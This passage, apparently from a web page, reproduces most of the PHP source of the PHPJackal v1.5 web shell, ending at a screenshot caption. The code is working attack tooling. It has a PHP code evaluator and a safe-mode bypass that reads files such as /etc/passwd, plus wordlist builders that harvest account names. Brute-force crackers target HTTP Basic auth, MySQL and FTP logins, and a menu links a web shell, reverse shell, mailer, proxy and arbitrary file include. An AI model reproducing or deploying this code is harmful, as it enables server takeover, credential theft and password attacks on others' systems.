echo "&lt;center&gt;${t}Evaler:&lt;/td&gt;&lt;td bgcolor=\"#333333\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;form method=\"POST\"&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#666666\"&gt;Codes:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;&lt;textarea rows=\"10\" name=\"code\" cols=\"64\"&gt;";if(!empty($_REQUEST['code']))echo htmlspecialchars($_REQUEST['code']);echo "&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#666666\"&gt;&lt;/td&gt;&lt;td bgcolor=\"#666666\" align=right&gt;$hcwd&lt;input class=buttons type=submit value=Execute&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/center&gt;";
}
function whoiS(){
global $t,$hcwd;
if (!empty($_REQUEST['server']) && !empty($_REQUEST['domain'])){
$server =$_REQUEST['server'];
$domain=$_REQUEST['domain']."\r\n";
$ser=fsockopen($server,43,$en,$es,5);
fputs($ser,$domain);
echo "&lt;pre&gt;";
while(!feof($ser))echo fgets($ser);
echo "&lt;/pre&gt;";
fclose($ser);
}
else{
echo "&lt;center&gt;${t}Whois:&lt;/td&gt;&lt;td bgcolor=\"#333333\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;form method=\"POST\"&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#666666\"&gt;Server:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;&lt;input type=text value=\"";if (!empty($_REQUEST['server'])) echo htmlspecialchars($_REQUEST['server']);else echo "whois.geektools.com"; echo "\" name=server size=35&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#808080\"&gt;domain:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;&lt;input type=text name=domain value=\"";if (!empty($_REQUEST['domain'])) echo htmlspecialchars($_REQUEST['domain']); else echo "google.com"; echo  "\" size=35&gt;&lt;/td&gt;&lt;tr&gt;&lt;td bgcolor=\"#666666\"&gt;&lt;/td&gt;&lt;td bgcolor=\"#666666\" align=right&gt;$hcwd&lt;input class=buttons type=submit value=\"Do\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/center&gt;";
}
}
function hexvieW(){
if (!empty($_REQUEST['filE'])){
$f = $_REQUEST['filE'];
echo "&lt;table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"100%\"&gt;&lt;td width=\"10%\" bgcolor=\"#282828\"&gt;Offset&lt;/td&gt;&lt;td width=\"25%\" bgcolor=\"#282828\"&gt;Hex&lt;/td&gt;&lt;td width=\"25%\" bgcolor=\"#282828\"&gt;&lt;/td&gt;&lt;td width=\"40%\" bgcolor=\"#282828\"&gt;ASCII&lt;/td&gt;&lt;/tr&gt;";
$file = fopen($f,"r");
$i= -1;
while (!feof($file)) {
$ln='';
$i++;
echo "&lt;tr&gt;&lt;td width=\"10%\" bgcolor=\"#";
if ($i % 2==0) echo "666666";else echo "808080";
echo "\"&gt;";echo str_repeat("0",(8-strlen($i * 16))).$i * 16;echo "&lt;/td&gt;";
echo "&lt;td width=\"25%\" bgcolor=\"#";
if ($i % 2==0) echo "666666";else echo "808080"; 
echo "\"&gt;";
for ($j=0;$j&lt;=7;$j++){
if (!feof($file)){
$tmp = strtoupper(dechex(ord(fgetc($file))));
if (strlen($tmp)==1) $tmp = "0".$tmp;
echo $tmp." ";
$ln.=$tmp;
}
}
echo "&lt;/td&gt;&lt;td width=\"25%\" bgcolor=\"#";
if ($i % 2==0) echo "666666";else echo "808080"; 
echo "\"&gt;";
for ($j=7;$j&lt;=14;$j++){
if (!feof($file)){
$tmp = strtoupper(dechex(ord(fgetc($file))));
if (strlen($tmp)==1) $tmp = "0".$tmp;
echo $tmp." ";
$ln.=$tmp;
}
}
echo "&lt;/td&gt;&lt;td width=\"40%\" bgcolor=\"#";
if ($i % 2==0) echo "666666";else echo "808080";
echo "\"&gt;";
$n=0;$asc="";$co=0;
for ($k=0;$k&lt;=16;$k++){
$co=hexdec(substr($ln,$n,2));
if (($co&lt;=31)||(($co&gt;=127)&&($co&lt;=160)))$co=46;
$asc.= chr($co);
$n+=2;
}
echo htmlspecialchars($asc);
echo "&lt;/td&gt;&lt;/tr&gt;";
}
}
fclose($file);
echo "&lt;/table&gt;";
}
function safemodE(){
global $windows,$t,$hcwd;
if (!empty($_REQUEST['file'])){
$i=1;
echo "&lt;pre&gt;\n&lt;font color=green&gt;Method $i:(ini_restore)&lt;/font&gt;&lt;font color=blue&gt;\n";
ini_restore("safe_mode");ini_restore("open_basedir");
$tmp = file_get_contents($_REQUEST['file']);
echo $tmp;
$i++;
echo "\n&lt;/font&gt;&lt;font color=green&gt;Method $i:(copy)&lt;/font&gt;&lt;font color=blue&gt;\n";
$tmp=tempnam("","cx");
copy("compress.zlib://".$_REQUEST['file'], $tmp);
$fh = fopen($tmp, "r");
$data = fread($fh, filesize($tmp));
fclose($fh);
echo $data;
$i++;
if(function_exists("curl_init")){
echo "\n&lt;/font&gt;&lt;font color=green&gt;Method $i:(curl_init)[A]&lt;/font&gt;&lt;font color=blue&gt;\n";
$fh = @curl_init("file://".$_REQUEST['file']."");
$tmp = @curl_exec($fh);
echo $tmp;
$i++;
echo "\n&lt;/font&gt;&lt;font color=green&gt;Method $i:(curl_init)[B]&lt;/font&gt;&lt;font color=blue&gt;\n";
$i++;
if(strstr($_REQUEST['file'],DIRECTORY_SEPARATOR))
$ch =curl_init("file:///".$_REQUEST['file']."\x00/../../../../../../../../../../../../".__FILE__);
else $ch = curl_init("file://".$_REQUEST['file']."\x00".__FILE__);
curl_exec($ch);
var_dump(curl_exec($ch));
}
if($_REQUEST['file'] == "/etc/passwd"){
echo "\n&lt;/font&gt;&lt;font color=green&gt;Method $i:(posix)&lt;/font&gt;&lt;font color=blue&gt;\n";
for($uid=0;$uid&lt;99999;$uid++){
$h=posix_getpwuid($uid);
if (!empty($h))foreach($h as $v)echo "$v:";}}
$i++;
echo "&lt;/pre&gt;&lt;/font&gt;";
}
echo "&lt;center&gt;${t}Anti Safe-Mode:&lt;/td&gt;&lt;td bgcolor=\"#333333\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;form method=\"POST\"&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#666666\"&gt;File:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;&lt;input type=text value=\"";if (!empty($_REQUEST['file'])) echo htmlspecialchars($_REQUEST['file']);elseif(!$windows) echo "/etc/passwd"; echo "\" name=file size=35&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td bgcolor=\"#808080\"&gt;&lt;/td&gt;&lt;td bgcolor=\"#808080\" align=right&gt;$hcwd&lt;input class=buttons type=submit value=\"Read\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/center&gt;";
}
function crackeR(){
global $et;
$cwd = getcwd();
echo "&lt;center&gt;&lt;table border=0 bgcolor=#333333&gt;&lt;tr&gt;&lt;td&gt;&lt;a href=\"".hlinK("seC=hc&workingdiR=$cwd")."\"&gt;[Hash]&lt;/a&gt; - &lt;a href=\"".hlinK("seC=smtp&workingdiR=$cwd")."\"&gt;[SMTP]&lt;/a&gt; - &lt;a href=\"".hlinK("seC=pop3&workingdiR=$cwd")."\"&gt;[POP3]&lt;/a&gt; - &lt;a href=\"".hlinK("seC=imap&workingdiR=$cwd")."\"&gt;[IMAP]&lt;/a&gt; - &lt;a href=\"".hlinK("seC=ftp&workingdiR=$cwd")."\"&gt;[FTP]&lt;/a&gt; - &lt;a href=\"".hlinK("seC=snmp&workingdiR=$cwd")."\"&gt;[SNMP]&lt;/a&gt; - &lt;a href=\"".hlinK("seC=sql&workingdiR=$cwd")."\"&gt;[MySQL]&lt;/a&gt; - &lt;a href=\"".hlinK("seC=fcr&workingdiR=$cwd")."\"&gt;[HTTP form]&lt;/a&gt; - &lt;a href=\"".hlinK("seC=auth&workingdiR=$cwd")."\"&gt;[HTTP Auth(basic)]&lt;/a&gt; - &lt;a href=\"".hlinK("seC=dic&workingdiR=$cwd")."\"&gt;[Dictionary maker]&lt;/a&gt;$et&lt;/center&gt;";
}
function dicmakeR(){
global $errorbox,$windows,$footer,$t,$et,$hcwd;
if (!empty($_REQUEST['combo'])&&($_REQUEST['combo']==1)) $combo=1 ; else $combo=0;
if (!empty($_REQUEST['range']) && !empty($_REQUEST['output']) && !empty($_REQUEST['min']) && !empty($_REQUEST['max'])){
$min = $_REQUEST['min'];
$max = $_REQUEST['max'];
if($max&lt;$min)die($errorbox ."Bad input!$et". $footer);
$s =$w="";
$out = $_REQUEST['output'];
$r = ($_REQUEST['range']=='a' )?'a':'A';
if ($_REQUEST['range']==0) $r=0;
for($i=0;$i&lt;$min;$i++) $s.=$r;
$dic = fopen($out,'a');
if(is_nan($r)){
while(strlen($s)&lt;=$max){
$w = $s;
if($combo)$w="$w:$w";
fwrite($dic,$w."\n");
$s++;}
}
else{
while(strlen($w)&lt;=$max){
$w =(string)str_repeat("0",($min - strlen($s))).$s;
if($combo)$w="$w:$w";
fwrite($dic,$w."\n");
$s++;}
}
fclose($dic);
echo "&lt;font color=blue&gt;Done&lt;/font&gt;";
}
if (!empty($_REQUEST['input']) && !empty($_REQUEST['output'])){
$input=fopen($_REQUEST['input'],'r');
if (!$input){
if ($windows)echo $errorbox. "Unable to read from ".htmlspecialchars($_REQUEST['input']) ."$et&lt;br&gt;";
else{
$input=explode("\n",shelL("cat $input"));
$output=fopen($_REQUEST['output'],'w');
if ($output){
foreach ($input as $in){
$user = $in;
$user = trim(fgets($in)," \n\r");
if (!strstr($user,":"))continue;
$user=substr($user,0,(strpos($user,':')));
if($combo) fwrite($output,$user.":".$user."\n"); else fwrite($output,$user."\n");
}
fclose($input);fclose($output);
echo "&lt;font color=blue&gt;Done&lt;/font&gt;";
}
}
}
else{
$output=fopen($_REQUEST['output'],'w');
if ($output){
while (!feof($input)){
$user = trim(fgets($input)," \n\r");
if (!strstr($user,":"))continue;
$user=substr($user,0,(strpos($user,':')));
if($combo) fwrite($output,$user.":".$user."\n"); else fwrite($output,$user."\n");
}
fclose($input);fclose($output);
echo "&lt;font color=blue&gt;Done&lt;/font&gt;";
}
else echo $errorbox." Unable to write data to ".htmlspecialchars($_REQUEST['input']) ."$et&lt;br&gt;";
}
}elseif (!empty($_REQUEST['url']) && !empty($_REQUEST['output'])){
$res=downloadiT($_REQUEST['url'],$_REQUEST['output']);
if($combo && $res){
$file=file($_REQUEST['output']);
$output=fopen($_REQUEST['output'],'w');
foreach ($file as $v)fwrite($output,"$v:$v\n");
fclose($output);
}
echo "&lt;font color=blue&gt;Done&lt;/font&gt;";
}else{
$temp=whereistmP();
echo "&lt;center&gt;${t}Wordlist generator:&lt;/td&gt;&lt;td bgcolor=\"#333333\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;form method=\"POST\"&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#666666\"&gt;Range:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;&lt;select name=range&gt;&lt;option value=a&gt;a-z&lt;/option&gt;&lt;option value=Z&gt;A-Z&lt;/option&gt;&lt;option value=0&gt;0-9&lt;/option&gt;&lt;/select&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#808080\"&gt;Min lenght:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;&lt;select name=min&gt;&lt;option value=1&gt;1&lt;/option&gt;&lt;option value=2&gt;2&lt;/option&gt;&lt;option value=3&gt;3&lt;/option&gt;&lt;option value=4&gt;4&lt;/option&gt;&lt;option value=5&gt;5&lt;/option&gt;&lt;option value=6&gt;6&lt;/option&gt;&lt;option value=7&gt;7&lt;/option&gt;&lt;option value=8&gt;8&lt;/option&gt;&lt;option value=9&gt;9&lt;/option&gt;&lt;option value=10&gt;10&lt;/option&gt;&lt;/select&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#666666\"&gt;Max lenght:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;&lt;select name=max&gt;&lt;option value=2&gt;2&lt;/option&gt;&lt;option value=3&gt;3&lt;/option&gt;&lt;option value=4&gt;4&lt;/option&gt;&lt;option value=5&gt;5&lt;/option&gt;&lt;option value=6&gt;6&lt;/option&gt;&lt;option value=7&gt;7&lt;/option&gt;&lt;option value=8 selected&gt;8&lt;/option&gt;&lt;option value=9&gt;9&lt;/option&gt;&lt;option value=10&gt;10&lt;/option&gt;&lt;option value=11&gt;11&lt;/option&gt;&lt;option value=12&gt;12&lt;/option&gt;&lt;option value=13&gt;13&lt;/option&gt;&lt;option value=14&gt;14&lt;/option&gt;&lt;option value=15&gt;15&lt;/option&gt;&lt;/select&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#808080\"&gt;Output:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;&lt;input type=text value=\"$temp/.dic\" name=output size=35&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#666666\"&gt;&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;&lt;input type=checkbox name=combo style=\"border-width:1px;background-color:#666666;\" value=1 checked&gt;Combo style output&lt;/td&gt;&lt;/tr&gt;&lt;td bgcolor=\"#808080\"&gt;&lt;/td&gt;&lt;td bgcolor=\"#808080\" align=right&gt;$hcwd&lt;input class=buttons type=submit value=Make&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;br&gt;${t}Grab dictionary:&lt;/td&gt;&lt;td bgcolor=\"#333333\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;form method=\"POST\"&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#666666\"&gt;Grab from:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;&lt;input type=text value=\"/etc/passwd\" name=input size=35&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#808080\"&gt;Output:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;&lt;input type=text value=\"$temp/.dic\" name=output size=35&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#666666\"&gt;&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;&lt;input type=checkbox style=\"border-width:1px;background-color:#666666;\" name=combo value=1 checked&gt;Combo style output&lt;/td&gt;&lt;/tr&gt;&lt;td bgcolor=\"#808080\"&gt;&lt;/td&gt;&lt;td bgcolor=\"#808080\" align=right&gt;$hcwd&lt;input class=buttons type=submit value=Grab&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;br&gt;${t}Download dictionary:&lt;/td&gt;&lt;td bgcolor=\"#333333\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;form method=\"POST\"&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#666666\"&gt;URL:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;&lt;input type=text value=\"http://vburton.ncsa.uiuc.edu/wordlist.txt\" name=url size=35&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#808080\"&gt;Output:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;&lt;input type=text value=\"$temp/.dic\" name=output size=35&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#666666\"&gt;&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;&lt;input type=checkbox style=\"border-width:1px;background-color:#666666;\" name=combo value=1 checked&gt;Combo style output&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td bgcolor=\"#808080\"&gt;&lt;/td&gt;&lt;td bgcolor=\"#808080\" align=right&gt;$hcwd&lt;input class=buttons type=submit value=Get&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/center&gt;";}
}
function calC(){
global $t,$et,$hcwd;
$fu = array('-','md5','sha1','crc32','hex','ip2long','long2ip','base64_encode','base64_decode','urldecode','urlencode');
if (!empty($_REQUEST['input']) && (in_array($_REQUEST['to'],$fu))){
echo "&lt;center&gt;${t}Output:&lt;br&gt;&lt;textarea rows=\"10\" cols=\"64\"&gt;";
if($_REQUEST['to']!='hex')echo $_REQUEST['to']($_REQUEST['input']);else for($i=0;$i&lt;strlen($_REQUEST['input']);$i++)echo strtoupper(dechex(ord($_REQUEST['input']{$i})));
echo "&lt;/textarea&gt;$et&lt;/center&gt;&lt;br&gt;";
}
echo "&lt;center&gt;${t}Convertor:&lt;/td&gt;&lt;td bgcolor=\"#333333\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;form method=\"POST\"&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#666666\"&gt;Input:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;&lt;textarea rows=\"10\" name=\"input\" cols=\"64\"&gt;";if(!empty($_REQUEST['input']))echo htmlspecialchars($_REQUEST['input']);echo "&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#808080\"&gt;Task:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;&lt;select size=1 name=to&gt;&lt;option value=md5&gt;MD5&lt;/option&gt;&lt;option value=sha1&gt;SHA1&lt;/option&gt;&lt;option value=crc32&gt;crc32&lt;/option&gt;&lt;option value=ip2long&gt;IP to long&lt;/option&gt;&lt;option value=long2ip&gt;Long to IP&lt;/option&gt;&lt;option value=hex&gt;HEX&lt;/option&gt;&lt;option value=urlencode&gt;URL encoding&lt;/option&gt;&lt;option value=urldecode&gt;URL decoding&lt;/option&gt;&lt;option value=base64_encode&gt;Base64 encoding&lt;/option&gt;&lt;option value=base64_decode&gt;Base64 decoding&lt;/option&gt;&lt;/select&gt;&lt;/td&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#666666\"&gt;&lt;/td&gt;&lt;td bgcolor=\"#666666\" align=right&gt;&lt;input class=buttons type=submit value=Convert&gt;&lt;/td&gt;&lt;/tr&gt;$hcwd&lt;/form&gt;&lt;/table&gt;&lt;/center&gt;";
}
function authcrackeR(){
global $errorbox,$et,$t,$crack,$hcwd;
if(!empty($_REQUEST['target']) && !empty($_REQUEST['dictionary'])){
$data='';
$method=($_REQUEST['method'])?'POST':'GET';
if(strstr($_REQUEST['target'],'?')){$data=substr($_REQUEST['target'],strpos($_REQUEST['target'],'?')+1);$_REQUEST['target']=substr($_REQUEST['target'],0,strpos($_REQUEST['target'],'?'));}
spliturL($_REQUEST['target'],$host,$page);
$type=$_REQUEST['combo'];
$user=(!empty($_REQUEST['user']))?$_REQUEST['user']:"";
if($method='GET')$page.=$data;
$dictionary=fopen($_REQUEST['dictionary'],'r');
echo "&lt;font color=blue&gt;";
while(!feof($dictionary)){
if($type){
$combo=trim(fgets($dictionary)," \n\r");
$user=substr($combo,0,strpos($combo,':'));
$pass=substr($combo,strpos($combo,':')+1);
}else{
$pass=trim(fgets($dictionary)," \n\r");
}
$so=fsockopen($host,80,$en,$es,5);
if(!$so){echo "$errorbox Can not connect to host$et";break;}
else{
$packet="$method /$page HTTP/1.0\r\nAccept-Encoding: text\r\nHost: $host\r\nReferer: $host\r\nConnection: Close\r\nAuthorization: Basic ".base64_encode("$user:$pass");
if($method=='POST')$packet.="Content-Type: application/x-www-form-urlencoded\r\nContent-Length: ".strlen($data);
$packet.="\r\n\r\n";
$packet.=$data;
fputs($so,$packet);
$res=substr(fgets($so),9,2);
fclose($so);
if($res=='20')echo "U: $user P: $pass&lt;/br&gt;";
flusheR();
}
}
echo "Done!&lt;/font&gt;";
}else echo "&lt;center&gt;&lt;form method=\"POST\" name=form&gt;${t}HTTP Auth cracker:&lt;/td&gt;&lt;td bgcolor=\"#333333\"&gt;&lt;select name=method&gt;&lt;option value=1&gt;POST&lt;/option&gt;&lt;option value=0&gt;GET&lt;/option&gt;&lt;/select&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#666666\"&gt;Dictionary:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;&lt;input type=text name=dictionary size=35&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#808080\"&gt;Dictionary type:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;&lt;input type=radio name=combo checked value=0 onClick=\"document.form.user.disabled = false;\" style=\"border-width:1px;background-color:#808080;\"&gt;Simple (P)&lt;input type=radio value=1 name=combo onClick=\"document.form.user.disabled = true;\" style=\"border-width:1px;background-color:#808080;\"&gt;Combo (U:P)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#666666\"&gt;Username:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;&lt;input type=text size=35 value=root name=user&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#808080\"&gt;Server:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;&lt;input type=text name=target value=localhost size=35&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#666666\"&gt;&lt;/td&gt;&lt;td bgcolor=\"#666666\" align=right&gt;$hcwd&lt;input class=buttons type=submit value=Start&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/center&gt;";
}
function sqlcrackeR(){
global $errorbox,$t,$et,$crack;
if (!function_exists("mysql_connect")){
echo "$errorbox Server does n`t support MySQL$et";
}
else{
if (!empty($_REQUEST['target']) && !empty($_REQUEST['dictionary'])){
$target=$_REQUEST['target'];
$type=$_REQUEST['combo'];
$user=(!empty($_REQUEST['user']))?$_REQUEST['user']:"";
$dictionary=fopen($_REQUEST['dictionary'],'r');
if ($dictionary){
echo "&lt;font color=blue&gt;Cracking ".htmlspecialchars($target)."...&lt;br&gt;";
while(!feof($dictionary)){
if($type){
$combo=trim(fgets($dictionary)," \n\r");
$user=substr($combo,0,strpos($combo,':'));
$pass=substr($combo,strpos($combo,':')+1);
}else{
$pass=trim(fgets($dictionary)," \n\r");
}
$sql=@mysql_connect($target,$user,$pass);
if($sql){echo "U: $user P: $pass (&lt;a href=\"".hlinK("seC=mysql&serveR=$target&useR=$user&pasS=$pass&querY=SHOW+DATABASES&workingdiR=".getcwd())."\"&gt;Connect&lt;/a&gt;)&lt;br&gt;";mysql_close($sql);if(!$type)break;}
flusheR();
}
echo "&lt;br&gt;Done&lt;/font&gt;";
fclose($dictionary);
}
else{
echo "$errorbox Can not open dictionary.$et";
}
}
else{
echo "&lt;center&gt;${t}MySQL cracker:$crack";
}
}
}
function ftpcrackeR(){
global $errorbox,$t,$et,$crack;
if (!function_exists("ftp_connect"))echo "$errorbox Server does n`t support FTP functions$et";
else{
if (!empty($_REQUEST['target']) && !empty($_REQUEST['dictionary'])){
$target=$_REQUEST['target'];
$type=$_REQUEST['combo'];
$user=(!empty($_REQUEST['user']))?$_REQUEST['user']:"";
$dictionary=fopen($_REQUEST['dictionary'],'r');
if ($dictionary){
echo "&lt;font color=blue&gt;Cracking ".htmlspecialchars($target)."...&lt;br&gt;";
while(!feof($dictionary)){
if($type){
$combo=trim(fgets($dictionary)," \n\r");
$user=substr($combo,0,strpos($combo,':'));
$pass=substr($combo,strpos($combo,':')+1);
}else{
$pass=trim(fgets($dictionary)," \n\r");
}
if(!$ftp=ftp_connect($target,21,8)){echo "$errorbox Can not connect to server.$et";break;}
if (@ftp_login($ftp,$user,$pass)){echo "U: $user P: $pass&lt;br&gt;";if(!$type)break;}
ftp_close($ftp);
flusheR();
}
echo "&lt;br&gt;Done&lt;/font&gt;";
fclose($dictionary);
}
else{
echo "$errorbox Can not open dictionary.$et";
}
}
else echo "&lt;center&gt;${t}FTP cracker:$crack";
}}
function openiT($name){
$ext=strtolower(substr($name,strrpos($name,'.')+1));
$src=array('php','php3','php4','phps','phtml','phtm','inc');
if(in_array($ext,$src))highlight_file($name);
else echo "&lt;font color=blue&gt;&lt;pre&gt;".htmlspecialchars(file_get_contents($name))."&lt;/pre&gt;&lt;/font&gt;";
}
function logouT(){
setcookie('passw','',time()-10000);
header('Location: '.hlinK());
}
?>
&lt;html&gt;
&lt;head&gt;
&lt;style&gt;body{background: #660000 scrollbar-base-color: #484848; scrollbar-arrow-color: #FFFFFF; scrollbar-track-color: #969696;font-size:16px;font-family:"Arial Narrow";}Table { font-size: 15px; } .buttons{font-family:Verdana;font-size:10pt;font-weight:normal;font-style:normal;color:#FFFFFF;background-color:#555555;border-style:solid;border-width:1px;border-color:#FFFFFF;}textarea{border: 0px #000000 solid;background: #EEEEEE;color: #000000;}input{background: #EEEEEE;border-width:1px;border-style:solid;border-color:black}select{background: #EEEEEE; border: 0px #000000 none;}&lt;/style&gt;
&lt;meta http-equiv="Content-Language" content="en-us"&gt;
&lt;title&gt;PHPJackal&lt;/title&gt;
&lt;/head&gt;&lt;body text="#E2E2E2" bgcolor="#660000" link="#DCDCDC" vlink="#DCDCDC" alink="#DCDCDC"&gt;
&lt;table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#282828" bgcolor="#333333" width="100%"&gt;
&lt;tr&gt;&lt;td&gt;&lt;a href=javascript:history.back(1)&gt;[Back]&lt;/a&gt; - &lt;a href="<?php $cwd= getcwd(); echo hlinK("seC=sysinfo&workingdiR=$cwd");?>"&gt;[Info]&lt;/a&gt; - &lt;a href="<?php echo hlinK("seC=fm&workingdiR=$cwd");?>"&gt;[File manager]&lt;/a&gt; - &lt;a href="<?php echo hlinK("seC=edit&workingdiR=$cwd");?>"&gt;[Editor]&lt;/a&gt; - &lt;a href="<?php echo hlinK("seC=webshell&workingdiR=$cwd");?>"&gt;[Web shell]&lt;/a&gt; - &lt;a href="<?php echo hlinK("seC=br&workingdiR=$cwd");?>"&gt;[B/R shell]&lt;/a&gt; - &lt;a href="<?php echo hlinK("seC=asm&workingdiR=$cwd");?>"&gt;[Safe-mode]&lt;/a&gt; - &lt;a href="<?php echo hlinK("seC=mysql&workingdiR=$cwd"); ?>"&gt;[SQL]&lt;/a&gt; - &lt;a href="<?php echo hlinK("seC=mailer&workingdiR=$cwd"); ?>"&gt;[Mailer]&lt;/a&gt; - &lt;a href="<?php echo hlinK("seC=eval&workingdiR=$cwd");?>"&gt;[Evaler]&lt;/a&gt; - &lt;a href="<?php echo hlinK("seC=sc&workingdiR=$cwd"); ?>"&gt;[Scanners]&lt;/a&gt; - &lt;a href="<?php echo hlinK("seC=cr&workingdiR=$cwd");?>"&gt;[Crackers]&lt;/a&gt; - &lt;a href="<?php echo hlinK("seC=px&workingdiR=$cwd");?>"&gt;[Pr0xy]&lt;/a&gt; - &lt;a href="<?php echo hlinK("seC=whois&workingdiR=$cwd");?>"&gt;[Whois]&lt;/a&gt; - &lt;a href="<?php echo hlinK("seC=calc&workingdiR=$cwd");?>"&gt;[Convert]&lt;/a&gt; - &lt;a href="<?php echo hlinK("seC=about&workingdiR=$cwd");?>"&gt;[About]&lt;/a&gt; <?php if(isset($_COOKIE['passw'])) echo "- [&lt;a href=\"".hlinK("seC=logout")."\"&gt;Logout&lt;/a&gt;]";?>&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;hr size=1 noshade&gt;
<?php
if (!empty($_REQUEST['seC'])){
switch($_REQUEST['seC']){
case 'fm':filemanager();break;
case 'sc':scanneR();break;
case 'phpinfo': phpinfo();break;
case 'edit': if (!empty($_REQUEST['open']))editoR($_REQUEST['filE']);
if (!empty($_REQUEST['Save'])){
$filehandle= fopen($_REQUEST['file'],"w");
fwrite($filehandle,$_REQUEST['edited']);
fclose($filehandle);}
if (!empty($_REQUEST['filE'])) editoR($_REQUEST['filE']);else editoR('');
break;
case 'openit':openiT($_REQUEST['namE']);break;
case 'cr': crackeR();break;
case 'dic':dicmakeR();break;
case 'whois':whoiS();break;
case 'hex':hexvieW();break;
case 'img':showimagE($_REQUEST['filE']);break;
case 'inc':include ($_REQUEST['filE']);break;
case 'hc':hashcrackeR();break;
case 'fcr':formcrackeR();break;
case 'snmp':snmpcrackeR();break;
case 'sql':sqlcrackeR();break;
case 'auth':authcrackeR();break;
case 'pop3':pop3crackeR();break;
case 'imap':imapcrackeR();break;
case 'smtp':smtpcrackeR();break;
case 'ftp':ftpcrackeR();break;
case 'eval':phpevaL();break;
case 'px':pr0xy();break;
case 'webshell':webshelL();break;
case 'mailer':maileR();break;
case 'br':brshelL();break;
case 'asm':safemodE();break;
case 'mysql':mysqlclienT();break;
case 'calc':calC();break;
case 'sysinfo':sysinfO();break;
case 'checksum':checksuM($_REQUEST['filE']);break;
case 'logout':logouT();break;
default: echo $intro;
}}else echo $intro;
echo $footer;?>&lt;/body&gt;&lt;/html&gt;
{% endhighlight %}

### PHPJackal v1.5 Shell screenshot<figure id="attachment_422" style="width: 604px;" class="wp-caption aligncenter">

